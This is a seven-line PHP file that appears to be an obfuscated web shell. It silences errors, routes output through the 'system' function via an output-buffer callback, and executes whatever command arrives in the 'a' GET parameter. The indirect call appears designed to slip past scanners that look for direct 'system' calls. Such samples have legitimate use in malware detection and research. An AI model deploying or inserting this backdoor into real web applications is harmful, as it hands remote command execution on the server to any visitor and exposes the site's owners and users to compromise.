<?php
error_reporting(0);
$foobar = `system`;
ob_start($foobar);
echo `{$_GET['a']}`;
ob_end_flush();
?>	